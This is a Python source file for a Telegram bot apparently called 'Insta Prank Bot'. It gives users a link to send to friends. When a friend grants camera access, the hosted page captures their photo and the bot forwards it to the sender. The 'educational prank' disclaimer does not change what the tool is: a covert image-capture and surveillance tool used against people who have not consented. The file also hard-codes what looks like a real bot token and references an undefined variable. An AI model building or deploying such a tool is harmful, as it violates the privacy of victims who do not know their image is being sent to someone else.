from flask import Flask, request
import telegram
import base64

app = Flask(__name__)

from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
from threading import Thread

BOT_TOKEN = '6515038883:AAF3LfbnrUcQBBWiSYs4qpjQCRNQWUAdG1o'  # Replace this
CHANNEL_USERNAME = '@freeinstagramfollowers_10'  # Replace this
WEB_BASE_URL = 'https://hiwhoisthis.netlify.app/'  # Replace with your hosted prank page


app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

# Store user_id to chat_id map
user_links = {}

@app.route('/')
def home():
    return "✅ Bot is Running - Team Tasmina"

@app.route('/send-photo', methods=['POST'])
def receive_photo():
    data = request.json
    user_id = str(data.get("user_id"))
    img_base64 = data.get("img_base64")

    chat_id = user_links.get(user_id)
    if chat_id and img_base64:
        bot.send_photo(
            chat_id=chat_id,
            photo=img_base64,
            caption="📸 New image captured!\n❤️ From your prank link — Team Tasmina"
        )
        return '✅ Photo sent'
    return '❌ Failed: Missing data', 400

def is_user_member(context, user_id):
    try:
        member = context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def send_prank_link(context, chat_id, name, user_id):
    prank_link = f"{NETLIFY_BASE_URL}/?userid={user_id}"
    user_links[str(user_id)] = chat_id  # Store mapping
    context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"🎉 Welcome {name}!\n\n"
            "🔐 *Disclaimer:*\nThis is an educational prank tool. Do not misuse it.\n\n"
            f"🔗 *Your prank link:* \n`{prank_link}`\n\n"
            "📤 Send this to your friend. If they allow camera, their pic will be sent to you 😄"
        ),
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Open Link", url=prank_link)]
        ])
    )

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    name = update.effective_user.first_name

    update.message.reply_text(
        f"👋 Hello *{name}*, welcome to the Insta Prank Bot by *Team Tasmina*!",
        parse_mode='Markdown'
    )
    update.message.reply_text(
        "⚠️ *Before you begin...*\n\n"
        "You must accept our *Terms & Conditions*. This tool is for fun only.\n\n"
        "Do you agree to use it responsibly?",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Accept & Continue", callback_data="accept_terms_start")]
        ])
    )

def accept_terms_start(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(context, user_id):
        send_prank_link(context, query.message.chat_id, name, user_id)
    else:
        query.message.reply_text(
            f"🚫 {name}, please join our Telegram channel first:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
                [InlineKeyboardButton("✅ I Joined", callback_data="check_join")]
            ])
        )

def check_join(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(context, user_id):
        send_prank_link(context, query.message.chat_id, name, user_id)
    else:
        query.message.reply_text("❌ You are still not a member. Please join the channel first.")

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    Thread(target=run).start()

def main():
    keep_alive()
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(accept_terms_start, pattern="accept_terms_start"))
    dp.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
